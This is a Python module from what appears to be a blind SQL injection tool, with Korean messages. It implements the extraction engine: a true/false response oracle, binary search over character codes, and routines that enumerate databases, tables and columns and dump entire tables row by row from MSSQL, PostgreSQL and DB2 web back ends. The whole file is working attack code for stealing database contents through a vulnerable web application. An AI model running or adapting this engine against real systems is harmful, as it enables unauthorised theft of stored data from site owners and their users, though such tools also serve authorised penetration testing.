"""DBMS와 독립적인 실행 흐름. 네트워크 오류는 거짓 결과로 간주하지 않는다."""

import re

from .dbms import Dialect, literal
from .oracle import ExecutionError, SizeOracle, StringOracle


def bounded_integer(predicate, maximum):
    """predicate(n)이 value > n일 때 [0, maximum]의 정수를 반환한다."""
    if predicate(maximum):
        raise ExecutionError(
            f"설정한 상한 {maximum}을 초과했습니다. 상한 설정을 확인하세요."
        )
    low, high = 0, maximum
    while low < high:
        middle = (low + high) // 2
        if predicate(middle):
            low = middle + 1
        else:
            high = middle
    return low


class Injector:
    def __init__(self, args, client):
        self.args = args
        self.client = client
        self.dialect = Dialect(args.dbms)
        self.oracle = (
            StringOracle(client, args.string, args.not_string)
            if args.string is not None or args.not_string is not None
            else SizeOracle(client)
        )

    def check(self, predicate):
        return self.oracle.check(predicate)

    def number(self, expression, maximum):
        value = bounded_integer(
            lambda middle: self.check(f"({expression})>{middle}"), maximum
        )
        if not self.check(f"({expression})={value}"):
            raise ExecutionError(
                "숫자 추출 결과를 검증하지 못했습니다. 응답 또는 데이터가 변경되었습니다."
            )
        return value

    def hex_unit(self, expression):
        length = self.number(self.dialect.ascii_length(expression), 8)
        value = "".join(
            chr(self.number(self.dialect.ascii_character(expression, index), 127))
            for index in range(1, length + 1)
        )
        if not value or not re.fullmatch(r"(?:[0-9A-F]{2}){1,4}", value):
            raise ExecutionError("문자 인코딩 추출 결과가 올바른 HEX 값이 아닙니다.")
        return value

    def verify_text(self, expression, value):
        if value is None:
            valid = self.check(f"({expression}) IS NULL")
        else:
            normalized = self.dialect.as_text(expression)
            if self.dialect.name == "mssql":
                raw = value.encode("utf-16le")
                units = [raw[index : index + 2] for index in range(0, len(raw), 2)]
            else:
                units = [char.encode("utf-8") for char in value]
            valid = self.check(f"({expression}) IS NOT NULL") and self.check(
                f"({self.dialect.length(normalized)})={len(units)}"
            )
            for index, unit in enumerate(units, 1):
                if not valid:
                    break
                hex_expression = self.dialect.unit_hex(normalized, index)
                valid = self.check(f"({hex_expression})={literal(unit.hex().upper())}")
        if not valid:
            raise ExecutionError(
                "문자열 추출 결과를 검증하지 못했습니다. 응답 또는 데이터가 변경되었습니다."
            )

    def text(self, expression):
        if self.check(f"({expression}) IS NULL"):
            return None
        normalized = self.dialect.as_text(expression)
        length = self.number(self.dialect.length(normalized), self.args.max_len)
        if self.dialect.name == "db2":
            # VARCHAR 변환에서 원본이 잘리는 경우를 검출한다.
            original = f"VARCHAR(({expression}))"
            if not self.check(f"({self.dialect.length(original)})={length}"):
                raise ExecutionError(
                    "DB2 문자열 변환 길이가 원본과 다릅니다. 긴 값 또는 타입을 확인하세요."
                )
        units = [
            self.hex_unit(self.dialect.unit_hex(normalized, index))
            for index in range(1, length + 1)
        ]
        try:
            value = bytes.fromhex("".join(units)).decode(
                "utf-16le" if self.dialect.name == "mssql" else "utf-8"
            )
        except (UnicodeError, ValueError) as exc:
            raise ExecutionError(
                "문자열 디코딩 실패: DB 문자셋·바이너리 타입·응답 판별을 확인하세요."
            ) from exc
        self.verify_text(expression, value)
        return value

    def execute(self):
        self.oracle.calibrate()
        if self.args.dbms == "db2" and not self.check(
            "(SELECT HEX(CAST(NCHR(54620) AS VARCHAR(4))) FROM SYSIBM.SYSDUMMY1)='ED959C'"
        ):
            raise ExecutionError("DB2 Unicode 처리는 UTF-8 데이터베이스가 필요합니다.")
        if self.args.dbms == "postgresql" and self.args.mode in (
            "tables",
            "columns",
            "dump",
        ):
            if not self.check(f"current_database()={literal(self.args.select_db)}"):
                raise ExecutionError(
                    "PostgreSQL -D는 웹 서버가 현재 연결 중인 DB여야 합니다."
                )
        results = self.extract()
        self.oracle.verify()
        return results

    def extract(self):
        if self.args.basic:
            return {
                query.label: self.text(query.item(0)) for query in self.dialect.basic()
            }
        if self.args.dump:
            return self.dump()
        tables = self.args.select_table if self.args.columns else [None]
        results = {}
        for table in tables:
            query = self.dialect.metadata(
                self.args.mode, self.args.select_db, table, self.args.db_schema
            )
            count = self.number(query.count, self.args.max_rows)
            values = []
            for index in range(count):
                value = self.text(query.item(index))
                values.append(value)
                print(f"[{index + 1}/{count}] {value}")
            results[table if self.args.columns else self.args.mode] = values
        return results

    def dump(self):
        table = self.args.select_table[0]
        queries = self.dialect.dump(
            self.args.select_db,
            table,
            self.args.select_column,
            self.args.order_by,
            self.args.db_schema,
        )
        duplicates = self.dialect.duplicate_order(
            self.args.select_db,
            table,
            self.args.order_by,
            self.args.db_schema,
        )
        for column in dict.fromkeys(self.args.select_column + self.args.order_by):
            type_query = self.dialect.column_type(
                self.args.select_db,
                table,
                column,
                self.args.db_schema,
            )
            if not self.check(f"({type_query.count})=1"):
                raise ExecutionError(
                    f"컬럼을 찾을 수 없거나 접근할 수 없습니다: {column}"
                )
            type_name = self.text(type_query.item(0))
            if type_name is None or not self.dialect.supports_type(type_name):
                raise ExecutionError(
                    f"지원하지 않는 덤프·정렬 컬럼 타입입니다: {column} ({type_name}). "
                    "텍스트·숫자·날짜 등 지원 스칼라 컬럼을 지정하세요."
                )
            if column in self.args.order_by and not self.dialect.supports_order_type(
                type_name
            ):
                raise ExecutionError(
                    f"이 타입은 정렬키로 사용할 수 없습니다: {column} ({type_name})"
                )
        if not self.check(f"({duplicates})=0"):
            raise ExecutionError(
                "--order-by 값이 중복됩니다. 행을 고유하게 구분하는 복합키를 지정하세요."
            )
        count = self.number(queries[0].count, self.args.max_rows)
        rows = []
        for index in range(count):
            row = {query.label: self.text(query.item(index)) for query in queries}
            for query in queries:
                self.verify_text(query.item(index), row[query.label])
            rows.append(row)
            print(f"[{index + 1}/{count}] 행 추출·검증 완료")
        # 완료 직전 행 수·키·각 셀을 다시 검사한다. DB 스냅샷을 보장하는 기능은 아니다.
        if not self.check(f"({queries[0].count})={count}") or not self.check(
            f"({duplicates})=0"
        ):
            raise ExecutionError("덤프 중 행 수 또는 정렬키가 변경되었습니다.")
        for index, row in enumerate(rows):
            for query in queries:
                self.verify_text(query.item(index), row[query.label])
        return {table: rows}
